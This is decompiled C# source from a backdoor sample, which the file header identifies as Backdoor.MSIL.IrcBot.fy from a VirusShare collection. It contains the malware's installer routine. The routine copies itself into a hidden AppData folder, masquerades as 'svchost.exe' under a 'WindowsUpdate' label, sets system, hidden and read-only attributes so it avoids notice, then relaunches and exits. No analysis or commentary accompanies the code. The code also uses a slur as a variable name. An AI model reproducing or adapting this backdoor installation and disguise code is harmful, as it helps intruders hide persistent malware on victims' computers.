// Decompiled with JetBrains decompiler
// Type: myApp.Install
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using System;
using System.Diagnostics;
using System.IO;

namespace myApp
{
  internal class Install
  {
    public static string gay = "WindowsUpdate";
    public static string TargetExeName = "svchost.exe";
    public static string targetFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dll";
    public static string goodpath = Path.Combine(Install.targetFolder, Install.TargetExeName);

    public static void Drop()
    {
      if (!(Environment.CurrentDirectory != Install.targetFolder))
        return;
      if (File.Exists(Install.goodpath))
      {
        try
        {
          File.SetAttributes(Install.goodpath, FileAttributes.Normal);
          File.Delete(Install.goodpath);
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, Install.goodpath);
          File.SetAttributes(Install.goodpath, File.GetAttributes(Install.goodpath) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
          Process.Start(new ProcessStartInfo()
          {
            FileName = "svchost.exe",
            WorkingDirectory = Install.targetFolder
          });
          Environment.Exit(0);
        }
        catch
        {
        }
      }
      else
      {
        try
        {
          if (!Directory.Exists(Install.targetFolder))
          {
            Directory.CreateDirectory(Install.targetFolder);
            File.SetAttributes(Install.targetFolder, File.GetAttributes(Install.targetFolder) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.NotContentIndexed);
          }
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, Install.goodpath);
          Process.Start(new ProcessStartInfo()
          {
            FileName = "svchost.exe",
            WorkingDirectory = Install.targetFolder
          });
          Environment.Exit(0);
        }
        catch
        {
        }
      }
    }
  }
}
